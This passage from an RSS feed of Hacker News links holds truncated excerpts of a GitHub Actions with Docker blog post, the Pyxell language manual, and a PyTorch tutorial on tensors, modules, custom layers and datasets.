<p>Next is our <code>jobs</code> block. We can define multiple jobs which would all run in parallel. If we need anything serial, it should happen within a single job. In our case, we have just one job with two actions.</p>
<p>The job itself starts with the checkout action, which handles checking out the repo's source into the job workspace, then we call our custom action by providing a path to the action folder.</p>
<p>In our <code>with</code> block we provide values for the inputs we defined on our action. You'll notice that two of the values are provided via <code>secrets</code>, which is a <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets">feature of GitHub</a> I wasn't aware of before this. It's very easy to work with!</p>
<h2 id="room-for-improvement">Room for improvement</h2>
<p>I think the main drawback here is potentially slow job run times, since we're installing our dependencies each time. Depending on what's actually slow, there are a number of ways it could be addressed.</p>
<p>In general, finding a base Docker image that has as much of what you need as possible (without too much bloat) is going to help. Maintaining your own images in a registry somewhere comes with it's own overhead, but that's also an option.</p>
<p>I'm sure using the marketplace approach could also be a way to address the performance issues, assuming you find actions that have your dependencies installed and configured appropriately, but the goal of this post was to explore a minimal action configuration while leveraging the power of Docker 😄.</p>
<p><strong>That's it!</strong> 👋</p>

    </section>
</article></div>]]>
            </description>
            <link>https://sethetter.com/posts/github-actions-with-docker/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066079</guid>
            <pubDate>Thu, 12 Nov 2020 03:28:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pyxell – a programming language that combines Python's elegance with C++'s speed]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25066058">thread link</a>) | @masijo
<br/>
November 11, 2020 | https://www.pyxell.org/docs/manual.html | <a href="https://web.archive.org/web/*/https://www.pyxell.org/docs/manual.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>Pyxell [<em>pixel</em>] is a multi-paradigm, statically typed programming language, compiled to machine code via C++.</p> <p>This manual should let you quickly learn all the details to start programming in Pyxell.
It is assumed that you already know some programming language (preferably Python), since basic programming concepts are not explained here.</p> <p>You are encouraged to run the code snippets and experiment with them for yourself.
To run Pyxell code, go to the <a href="https://www.pyxell.org/docs/playground.html">Playground</a>,
clone the repository and follow the instructions on <a href="https://github.com/adamsol/Pyxell#requirements" target="_blank" rel="noopener noreferrer">Github<span> <span>(opens new window)</span></span></a>,
or download Windows binaries from the <a href="https://github.com/adamsol/Pyxell/releases" target="_blank" rel="noopener noreferrer">Releases<span> <span>(opens new window)</span></span></a>.</p> <h2 id="hello-world"><a href="#hello-world">#</a> Hello, world!</h2> <p>If you can run the following code and see the message on the screen, you are ready to start.</p> <h2 id="variables-and-types"><a href="#variables-and-types">#</a> Variables and types</h2> <h3 id="variable-declaration"><a href="#variable-declaration">#</a> Variable declaration</h3> <p>Pyxell is statically typed. Variables have types assigned during compilation.
In most cases, type of an expression is automatically inferred and the value can be directly assigned to a variable.</p> <p>In other cases, when the type cannot be inferred or you want to declare a variable without initializing it, you can set the type explicitly.
When not directly initialized, variable is automatically initialized with the default value for a given type.
You can find the list of all available types and their default values in the <a href="https://www.pyxell.org/docs/specification.html#types">Specification</a>.</p> <p>Variable name must start with a letter, but may also contain digits, underscores, and apostrophes.
Once a variable has been created, its type cannot be changed.</p> <h3 id="type-coercion"><a href="#type-coercion">#</a> Type coercion</h3> <p>Values of some types can be automatically converted to more general types: <code>Int -&gt; Rat -&gt; Float</code> or <code>Char -&gt; String</code>.</p> <p>The coercion doesn't work in the other direction.</p> <h2 id="arithmetic-and-logic"><a href="#arithmetic-and-logic">#</a> Arithmetic and logic</h2> <h3 id="numbers"><a href="#numbers">#</a> Numbers</h3> <p>Standard integers in Pyxell have 64 bits of precision and range from <code>-2^63</code> to <code>2^63-1</code>.
Binary, octal, and hexadecimal literals are supported.</p> <p>Rational numbers have unlimited precision.
They can be written either as integers with <code>r</code> suffix, or non-integers in decimal form.
They are also created as the result of division or exponentiation
(to obtain an integer from a division or exponentiation, use lossy <code>//</code> and <code>^^</code> operators).</p> <p>You can retrieve the numerator and denominator from a rational number.</p> <p>Floating-point numbers have 64 bits of precision and follow the IEEE 754 standard.
They can be written with <code>f</code> suffix or in scientific notation.</p> <p>Underscores can be additionally used in all numeric literals, to enhance readability of long numbers.</p> <h3 id="boolean-values"><a href="#boolean-values">#</a> Boolean values</h3> <p>There are two boolean values: <code>true</code> and <code>false</code>.
Logical negation and short-circuiting conjunction and disjunction operators are available.</p> <p>Boolean values are most often obtained in the result of comparisons.
When comparison operators are chained, they behave as if connected with <code>and</code> operator.</p> <h2 id="characters-and-strings"><a href="#characters-and-strings">#</a> Characters and strings</h2> <h3 id="characters"><a href="#characters">#</a> Characters</h3> <p>Characters are written in single quotes.</p> <p>You can get character's ASCII code, as well as obtain character corresponding to a given integer.</p> <p>You can also perform some arithmetic operations on characters.</p> <h3 id="strings"><a href="#strings">#</a> Strings</h3> <p>Strings are immutable sequences of characters. They are written in double quotes.</p> <p>You can access string's length, as well as its individual characters. Negative indexing and slicing is also supported, like in Python.</p> <p>Strings can be concatenated with <code>+</code> operator and repeated with <code>*</code> operator.</p> <p>You can construct formatted strings using interpolation syntax.</p> <h2 id="control-flow"><a href="#control-flow">#</a> Control flow</h2> <p>Pyxell uses indentation-based syntax, similar to Python's. Only spaces are allowed (tab character will cause a syntax error).
Rather than <code>:</code> character, Pyxell uses <code>do</code> keyword for indicating beginning of a block, and <code>def</code> keyword for function and class definitions.
The scope of a variable declared in a block is limited to that block.</p> <h3 id="if-statement"><a href="#if-statement">#</a> <code>if</code> statement</h3> <p>The first branch whose condition evaluates to <code>true</code> is executed.</p> <h3 id="while-loop"><a href="#while-loop">#</a> <code>while</code> loop</h3> <p>The loop runs while the condition is satisfied.</p> <h3 id="until-loop"><a href="#until-loop">#</a> <code>until</code> loop</h3> <p>This loop is similar to <code>while</code> loop, but it is always executed at least once and runs until the condition is satisfied.</p> <h3 id="for-loop"><a href="#for-loop">#</a> <code>for</code> loop</h3> <p>It can be used to loop over ranges (of numbers or characters) and other iterables.
Range can be inclusive (<code>a..b</code>), exclusive (<code>a...b</code>), or infinite (<code>a...</code>).</p> <p>You can optionally provide a step value, which can be either positive or negative (it is 1 by default).</p> <p>It is possible to loop over multiple iterables at once and provide custom step values to any of them.</p> <h3 id="continue-and-break"><a href="#continue-and-break">#</a> <code>continue</code> and <code>break</code></h3> <p>Inside loops you can use statements to exit the current iteration or the whole loop.</p> <h2 id="containers"><a href="#containers">#</a> Containers</h2> <h3 id="arrays"><a href="#arrays">#</a> Arrays</h3> <p>Arrays are similar to strings, but they are mutable and can have elements of any type.</p> <p>Containers have reference semantics, so they are not implicitly copied when variables are passed.
Mutation of one instance is reflected in all other instances of the same container.</p> <p>When an empty array is used, its type must be explicitly given.</p> <p>Arrays can be concatenated, repeated, and compared using standard operators.</p> <p>You can use array comprehension, as well as range literals and spread operator with optional step.</p> <p>For type safety, containers in Pyxell are invariant, which means they cannot be implicitly converted to another type,
even if types of the elements match (see <a href="https://stackoverflow.com/q/2745265" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a> for a broader explanation).
However, container literals can be automatically converted.</p> <h3 id="sets"><a href="#sets">#</a> Sets</h3> <p>Sets contain no duplicates and do not preserve order of elements.</p> <p>Empty set can be created like an empty array.</p> <p>To check if an element is in the set, use <code>in</code> operator.</p> <p>There exist operators for set union, difference, and intersection.</p> <p>Like with arrays, you can use comprehensions, ranges, and spread syntax to create sets.</p> <p>Containers are not hashable, so they cannot be stored in sets.</p> <h3 id="dictionaries"><a href="#dictionaries">#</a> Dictionaries</h3> <p>Dictionaries are hash maps. Like sets, they do not preserve order of elements.
They work similarly to <code>defaultdict</code> in Python: if a key is not present, the default value for a given type is automatically created in the dictionary.</p> <p>Empty dictionary literal has an additional colon.</p> <p>Use <code>in</code> operator for checking if the dictionary contains a given key.</p> <p>Dictionaries can be merged with <code>+</code> operator. In the case of repeated keys, the second value wins.</p> <p>Dictionary comprehension works similarly to array and set comprehension.</p> <p>When iterated over, dictionaries produce pairs of key and value.</p> <p>Spread operator for dictionaries consists of an extra colon.</p> <h2 id="nullable-types"><a href="#nullable-types">#</a> Nullable types</h2> <p>To accept <code>null</code> value, variable's type must be explicitly marked as nullable.</p> <p>You can either directly check if a value is <code>null</code>, or use special coalescing and conditional operators.</p> <p>There is also an operator to directly retrieve the value, for cases when you are sure it is not null.</p> <h2 id="tuples"><a href="#tuples">#</a> Tuples</h2> <p>Two or more values separated with a comma (outside of a container, function call, and print statement) form a tuple.</p> <p>Values can be retrieved using alphabetical properties or tuple destructuring (unneeded part can be discarded with an underscore).</p> <p>Tuples are mutable, but they have value semantics, so they are hashable and can be passed around as if they were immutable.</p> <h2 id="functions"><a href="#functions">#</a> Functions</h2> <h3 id="function-definition-and-call"><a href="#function-definition-and-call">#</a> Function definition and call</h3> <p>Basic definition of a function consists of its name, list of arguments, return type, and body.</p> <p>When a function does not return anything, the return type may be written as <code>Void</code> or may be omitted completely.</p> <p>You can provide default values for optional arguments.
The expressions will be evaluated every time the function is called (if they are needed), so mutable container literals can be safely used.</p> <p>Arguments can be also passed in any order using their names.</p> <p>Variadic functions are supported too. This is just a syntactic sugar for passing an array.
Ranges and spread syntax can be used when such a function is called.</p> <p>Functions can be stored in variables, passed to other functions as arguments, etc.
However, when a function is converted to a variable, all information about its arguments except for their types is lost.</p> <h3 id="generic-functions"><a href="#generic-functions">#</a> Generic functions</h3> <p>Generic functions are standard functions with additional type variables, which can be used just like normal types.
They are compiled independently for each combination of types they are called with.</p> <p>Function declaration may contain default values for generic arguments, and the body may contain any code dependent on the real types.
Errors will be reported when the function cannot be compiled with given types.</p> <p>When a type name is used more than once, the compiler will try to unify types of the arguments, following the coercion rules.</p> <h3 id="lambda-functions"><a href="#lambda-functions">#</a> Lambda functions</h3> <p>Lambda is a simpler version of generic function, where all arguments, as well as the return type, are generic.</p> <p>You can use placeholder syntax to write even more concise functions. Each underscore corresponds to one argument.</p> <p>Placeholder resolving doesn't run through function calls by default (placeholders inside a function call form their own functions for corresponding arguments).
To create a partial function, add <code>@</code> character.</p> <p>Lambdas can also be multi-line, so that you can define normal functions without any type annotations.</p> <p>Note that lambda functions currently work only with arguments of known types.
You cannot pass a lambda function to another lambda function.
In the case of functional arguments, it's better to use the full generic definition instead.</p> <h3 id="generators"><a href="#generators">#</a> Generators</h3> <p>Generator is a function producing a sequence of values that can be iterated over without storing it in memory.
To create a generator, add an asterisk symbol to the function definition.</p> <p>Lambdas can be generators as well.</p> <p>Note that generators are currently supported only with Clang.</p> <h2 id="classes"><a href="#classes">#</a> Classes</h2> <h3 id="class-definition-and-object-construction"><a href="#class-definition-and-object-construction">#</a> Class definition and object construction</h3> <p>Definition of a class consists of its name and list of fields.
Each field may have an explicit default value; if not provided, it will be the default value for a given type.</p> <p>Every class has a default constructor function that accepts field values in the order of definition, or as named arguments.
Fields not directly initialized will receive their default values.</p> <p>Remember that class objects must always be explicitly constructed before use (they have no valid default …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pyxell.org/docs/manual.html">https://www.pyxell.org/docs/manual.html</a></em></p>]]>
            </description>
            <link>https://www.pyxell.org/docs/manual.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066058</guid>
            <pubDate>Thu, 12 Nov 2020 03:25:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete Guide to PyTorch for Data Scientists]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065771">thread link</a>) | @shirappu
<br/>
November 11, 2020 | https://mlwhiz.com/blog/2020/09/09/pytorch_guide/ | <a href="https://web.archive.org/web/*/https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><strong>PyTorch</strong></em> has sort of became one of the de facto standards for creating Neural Networks now, and I love its interface. Yet, it is somehow a little difficult for beginners to get a hold of.</p><p>I remember picking PyTorch up only after some extensive experimentation a couple of years back. To tell you the truth, it took me a lot of time to pick it up but am I glad that I moved from
<a href="https://towardsdatascience.com/moving-from-keras-to-pytorch-f0d4fff4ce79" target="_blank" rel="nofollow noopener">Keras to PyTorch</a>
. With its high customizability and pythonic syntax,PyTorch is just a joy to work with, and I would recommend it to anyone who wants to do some heavy lifting with Deep Learning.</p><p>So, in this PyTorch guide, <em><strong>I will try to ease some of the pain with PyTorch for starters</strong></em> and go through some of the most important classes and modules that you will require while creating any Neural Network with Pytorch.</p><p>But, that is not to say that this is aimed at beginners only as <em><strong>I will also talk about the</strong></em> <em><strong>high customizability PyTorch provides and will talk about custom Layers, Datasets, Dataloaders, and Loss functions</strong></em>.</p><p>So let’s get some coffee ☕ ️and start it up.</p><hr><h2 id="tensors">Tensors</h2><p>Tensors are the basic building blocks in PyTorch and put very simply, they are NumPy arrays but on GPU. In this part, I will list down some of the most used operations we can use while working with Tensors. This is by no means an exhaustive list of operations you can do with Tensors, but it is helpful to understand what tensors are before going towards the more exciting parts.</p><h3 id="1-create-a-tensor">1. Create a Tensor</h3><p>We can create a PyTorch tensor in multiple ways. This includes converting to tensor from a NumPy array. Below is just a small gist with some examples to start with, but you can do a whole lot of
<a href="https://pytorch.org/docs/stable/tensors.html" target="_blank" rel="nofollow noopener">more things</a>
with tensors just like you can do with NumPy arrays.</p><div><pre><code data-lang="py"><span># Using torch.Tensor</span>
t <span>=</span> torch<span>.</span>Tensor([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
<span>print</span>(f<span>"Created Tensor Using torch.Tensor:</span><span>\n</span><span>{t}"</span>)

<span># Using torch.randn</span>
t <span>=</span> torch<span>.</span>randn(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.randn:</span><span>\n</span><span>{t}"</span>)

<span># using torch.[ones|zeros](*size)</span>
t <span>=</span> torch<span>.</span>ones(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.ones:</span><span>\n</span><span>{t}"</span>)
t <span>=</span> torch<span>.</span>zeros(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.zeros:</span><span>\n</span><span>{t}"</span>)

<span># using torch.randint - a tensor of size 4,5 with entries between 0 and 10(excluded)</span>
t <span>=</span> torch<span>.</span>randint(low <span>=</span> <span>0</span>,high <span>=</span> <span>10</span>,size <span>=</span> (<span>4</span>,<span>5</span>))
<span>print</span>(f<span>"Created Tensor Using torch.randint:</span><span>\n</span><span>{t}"</span>)

<span># Using from_numpy to convert from Numpy Array to Tensor</span>
a <span>=</span> np<span>.</span>array([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
t <span>=</span> torch<span>.</span>from_numpy(a)
<span>print</span>(f<span>"Convert to Tensor From Numpy Array:</span><span>\n</span><span>{t}"</span>)

<span># Using .numpy() to convert from Tensor to Numpy array</span>
t <span>=</span> t<span>.</span>numpy()
<span>print</span>(f<span>"Convert to Numpy Array From Tensor:</span><span>\n</span><span>{t}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/0.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><h3 id="2-tensor-operations">2. Tensor Operations</h3><p>Again, there are a lot of operations you can do on these tensors. The full list of functions can be found
<a href="https://pytorch.org/docs/stable/torch.html?highlight=mm#math-operations" target="_blank" rel="nofollow noopener">here</a>
.</p><div><pre><code data-lang="py">A <span>=</span> torch<span>.</span>randn(<span>3</span>,<span>4</span>)
W <span>=</span> torch<span>.</span>randn(<span>4</span>,<span>2</span>)
<span># Multiply Matrix A and W</span>
t <span>=</span> A<span>.</span>mm(W)
<span>print</span>(f<span>"Created Tensor t by Multiplying A and W:</span><span>\n</span><span>{t}"</span>)
<span># Transpose Tensor t</span>
t <span>=</span> t<span>.</span>t()
<span>print</span>(f<span>"Transpose of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># Square each element of t</span>
t <span>=</span> t<span>**</span><span>2</span>
<span>print</span>(f<span>"Square each element of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># return the size of a tensor</span>
<span>print</span>(f<span>"Size of Tensor t using .size():</span><span>\n</span><span>{t.size()}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/1.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p><strong>Note:</strong> What are PyTorch Variables? In the previous versions of Pytorch, Tensor and Variables used to be different and provided different functionality, but now the Variable API is
<a href="https://pytorch.org/docs/stable/autograd.html#variable-deprecated" target="_blank" rel="nofollow noopener">deprecated</a>
, and all methods for variables work with Tensors. So, if you don’t know about them, it’s fine as they re not needed, and if you know them, you can forget about them.</p><hr><h2 id="the-nnmodule">The nn.Module</h2><p>Photo by
<a href="https://unsplash.com/@fernanddecanne?utm_source=medium&amp;utm_medium=referral" target="_blank" rel="nofollow noopener">Fernand De Canne</a>
on
<img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1200x0_resize_box_2.png 1200w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1500x0_resize_box_2.png 1500w" src="https://mlwhiz.com/images/pytorch_guide/2.png" alt="<a href=&quot;https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;>Unsplash</a>"></p><p>Here comes the fun part as we are now going to talk about some of the most used constructs in Pytorch while creating deep learning projects. nn.Module lets you create your Deep Learning models as a class. You can inherit from nn.Moduleto define any model as a class. Every model class necessarily contains an<code> __init__</code> procedure block and a block for the <code>forward</code> pass.</p><ul><li><p>In the <code>__init__</code> part, the user can define all the layers the network is going to have but doesn’t yet define how those layers would be connected to each other.</p></li><li><p>In the <code>forward</code> pass block, the user defines how data flows from one layer to another inside the network.</p></li></ul><p>So, put simply, any network we define will look like:</p><div><pre><code data-lang="py"><span>class</span> <span>myNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)
    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        x <span>=</span> self<span>.</span>lin2(x)
        <span>return</span> x
</code></pre></div><p>Here we have defined a very simple Network that takes an input of size 784 and passes it through two linear layers in a sequential manner. But the thing to note is that we can define any sort of calculation while defining the forward pass, and that makes PyTorch highly customizable for research purposes. For example, in our crazy experimentation mode, we might have used the below network where we arbitrarily attach our layers. Here we send back the output from the second linear layer back again to the first one after adding the input to it(skip connection) back again(I honestly don’t know what that will do).</p><div><pre><code data-lang="py"><span>class</span> <span>myCrazyNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>784</span>)
        self<span>.</span>lin3 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x_lin1 <span>=</span> self<span>.</span>lin1(x)
        x_lin2 <span>=</span> x <span>+</span> self<span>.</span>lin2(x_lin1)
        x_lin2 <span>=</span> self<span>.</span>lin1(x_lin2)
        x <span>=</span> self<span>.</span>lin3(x_lin2)
        <span>return</span> x
</code></pre></div><p>We can also check if the neural network forward pass works. I usually do that by first creating some random input and just passing that through the network I have created.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCrazyNeuralNet()
model(x)<span>.</span>size()
<span>--------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><hr><h2 id="a-word-about-layers">A word about Layers</h2><p>Pytorch is pretty powerful, and you can actually create any new experimental layer by yourself using <code>nn.Module</code>. For example, rather than using the predefined Linear Layer <code>nn.Linear</code> from Pytorch above, we could have created our <strong>custom linear layer</strong>.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomLinearLayer</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self,in_size,out_size):
        super()<span>.</span>__init__()
        self<span>.</span>weights <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>randn(in_size, out_size))
        self<span>.</span>bias <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>zeros(out_size))
    <span>def</span> <span>forward</span>(self, x):
        <span>return</span> x<span>.</span>mm(self<span>.</span>weights) <span>+</span> self<span>.</span>bias
</code></pre></div><p>You can see how we wrap our weights tensor in nn.Parameter. This is done to make the tensor to be considered as a model parameter. From PyTorch
<a href="https://pytorch.org/docs/stable/generated/torch.nn.parameter.Parameter.html#parameter" target="_blank" rel="nofollow noopener">docs</a>
:</p><blockquote><p>Parameters are
<a href="https://pytorch.org/docs/stable/tensors.html#torch.Tensor" target="_blank" rel="nofollow noopener">&lt;code&gt;*Tensor*&lt;/code&gt;</a>
subclasses, that have a very special property when used with <em>Module</em> - when they’re assigned as Module attributes they are automatically added to the list of its parameters, and will appear in <em><code>parameters()</code></em> iterator</p></blockquote><p>As you will later see, the <code>model.parameters()</code> iterator will be an input to the optimizer. But more on that later.</p><p>Right now, we can now use this custom layer in any PyTorch network, just like any other layer.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> myCustomLinearLayer(<span>784</span>,<span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        <span>return</span> x
x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCustomNeuralNet()
model(x)<span>.</span>size()
<span>------------------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><p>But then again, Pytorch would not be so widely used if it didn’t provide a lot of ready to made layers used very frequently in wide varieties of Neural Network architectures. Some examples are:
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Linear.html#torch.nn.Linear" target="_blank" rel="nofollow noopener">nn.Linear</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Conv2d.html#torch.nn.Conv2d" target="_blank" rel="nofollow noopener">nn.Conv2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MaxPool2d.html#torch.nn.MaxPool2d" target="_blank" rel="nofollow noopener">nn.MaxPool2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.ReLU.html#torch.nn.ReLU" target="_blank" rel="nofollow noopener">nn.ReLU</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.BatchNorm2d.html#torch.nn.BatchNorm2d" target="_blank" rel="nofollow noopener">nn.BatchNorm2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Dropout.html#torch.nn.Dropout" target="_blank" rel="nofollow noopener">nn.Dropout</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html#torch.nn.Embedding" target="_blank" rel="nofollow noopener">nn.Embedding</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.GRU.html#torch.nn.GRU" target="_blank" rel="nofollow noopener">nn.GRU</a>
/
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LSTM.html#torch.nn.LSTM" target="_blank" rel="nofollow noopener">nn.LSTM</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Softmax.html#torch.nn.Softmax" target="_blank" rel="nofollow noopener">nn.Softmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LogSoftmax.html#torch.nn.LogSoftmax" target="_blank" rel="nofollow noopener">nn.LogSoftmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MultiheadAttention.html#torch.nn.MultiheadAttention" target="_blank" rel="nofollow noopener">nn.MultiheadAttention</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerEncoder.html#torch.nn.TransformerEncoder" target="_blank" rel="nofollow noopener">nn.TransformerEncoder</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerDecoder.html#torch.nn.TransformerDecoder" target="_blank" rel="nofollow noopener">nn.TransformerDecoder</a></p><p>I have linked all the layers to their source where you could read all about them, but to show how I usually try to understand a layer and read the docs, I would try to look at a very simple convolutional layer here.</p><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/3.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p>So, a Conv2d Layer needs as input an Image of height H and width W, with <code>Cin</code> channels. Now, for the first layer in a convnet, the number of <code>in_channels</code> would be 3(RGB), and the number of <code>out_channels</code> can be defined by the user. The <code>kernel_size</code> mostly used is 3x3, and the <code>stride</code> normally used is 1.</p><p>To check a new layer which I don’t know much about, I usually try to see the input as well as output for the layer like below where I would first initialize the layer:</p><div><pre><code data-lang="py">conv_layer <span>=</span> nn<span>.</span>Conv2d(in_channels <span>=</span> <span>3</span>, out_channels <span>=</span> <span>64</span>, kernel_size <span>=</span> (<span>3</span>,<span>3</span>), stride <span>=</span> <span>1</span>, padding<span>=</span><span>1</span>)
</code></pre></div><p>And then pass some random input through it. Here 100 is the batch size.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>3</span>,<span>24</span>,<span>24</span>))
conv_layer(x)<span>.</span>size()
<span>--------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>64</span>, <span>24</span>, <span>24</span>])
</code></pre></div><p>So, we get the output from the convolution operation as required, and I have sufficient information on how to use this layer in any Neural Network I design.</p><hr><h2 id="datasets-and-dataloaders">Datasets and DataLoaders</h2><p>How would we pass data to our Neural nets while training or while testing? We can definitely pass tensors as we have done above, but Pytorch also provides us with pre-built Datasets to make it easier for us to pass data to our neural nets. You can check out the complete list of datasets provided at
<a href="https://pytorch.org/docs/stable/torchvision/datasets.html" target="_blank" rel="nofollow noopener">torchvision.datasets</a>
and
<a href="https://pytorch.org/text/datasets.html" target="_blank" rel="nofollow noopener">torchtext.datasets</a>
. But, to give a concrete example for datasets, let’s say we had to pass images to an Image Neural net using a folder which has images in this structure:</p><pre><code>data
    train
        sailboat
        kayak
        .
        .
</code></pre><p>We can use torchvision.datasets.ImageFolder dataset to get an example image like below:</p><div><pre><code data-lang="py"><span>from</span> torchvision <span>import</span> transforms
<span>from</span> torchvision.datasets <span>import</span> ImageFolder
traindir <span>=</span> <span>"data/train/"</span>
t <span>=</span> transforms<span>.</span>Compose([
        transforms<span>.</span>Resize(size<span>=</span><span>256</span>),
    transforms<span>.</span>CenterCrop(size<span>=</span><span>224</span>),
        transforms<span>.</span>ToTensor()])
train_dataset <span>=</span> ImageFolder(root<span>=</span>traindir,transform<span>=</span>t)
<span>print</span>(…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</a></em></p>]]>
            </description>
            <link>https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065771</guid>
            <pubDate>Thu, 12 Nov 2020 02:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Fastest Way of Computing All Universes (2012) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065400">thread link</a>) | @optimalsolver
<br/>
